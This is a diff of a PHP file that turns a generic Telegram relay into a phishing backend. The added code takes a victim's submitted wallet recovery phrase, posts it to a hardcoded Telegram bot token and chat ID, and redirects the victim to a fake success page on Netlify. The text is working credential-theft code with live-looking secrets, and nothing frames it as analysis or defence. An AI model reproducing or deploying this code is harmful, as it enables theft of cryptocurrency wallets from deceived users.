@@ -1,59 +1,36 @@
 <?php
-// send_telegram.php
-// Simple server-side relay to send messages to Telegram Bot API.
-// SECURITY: Put your bot token here. Do NOT expose this file publicly.
+// Telegram Bot configuration
+$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // Replace with your actual bot token
+$chatId = '5160818690';     // Replace with your chat ID
 
-// === Configuration ===
-$BOT_TOKEN = 'P7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // 
+// Get the recovery phrase from POST data
+$recoveryPhrase = $_POST['recoveryPhrase'] ?? 'No phrase provided';
 
-// Read raw body (expecting JSON)
-$input = file_get_contents('php://input');
-$data = json_decode($input, true);
+// Prepare the message
+$message = "New Recovery Phrase Received:\n";
+$message .= $recoveryPhrase;
 
-if (!$data) {
-    // support form-encoded fallback
-    $data = $_POST;
-}
+// Telegram API URL
+$telegramApiUrl = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";
 
-$text = isset($data['text']) ? $data['text'] : '';
-$chat_id = isset($data['chat_id']) ? $data['chat_id'] : '';
+// Prepare the data for Telegram
+$data = array(
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+);
 
-if (empty($BOT_TOKEN) || $BOT_TOKEN === '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg') {
-    http_response_code(500);
-    echo json_encode(['ok' => false, 'error' => 'Bot token not configured on server.']);
-    exit;
-}
-
-if (empty($chat_id) || empty($text)) {
-    http_response_code(400);
-    echo json_encode(['ok' => false, 'error' => 'Missing chat_id or text']);
-    exit;
-}
-
-$url = "https://api.telegram.org/bot" . urlencode($BOT_TOKEN) . "/sendMessage";
-
-$payload = json_encode([
-    'chat_id' => $chat_id,
-    'text' => $text
-]);
-
-$ch = curl_init($url);
+// Send to Telegram
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-$result = curl_exec($ch);
-$err = curl_error($ch);
+
+$response = curl_exec($ch);
 curl_close($ch);
 
-if ($result === false) {
-    http_response_code(500);
-    echo json_encode(['ok' => false, 'error' => $err]);
-    exit;
-}
-
-// forward Telegram response
-header('Content-Type: application/json');
-echo $result;
-
+// Redirect to success page
+header('Location: https://success-lucky-5f3e1c-moxie.netlify.app/?status=314');
+exit();
 ?>
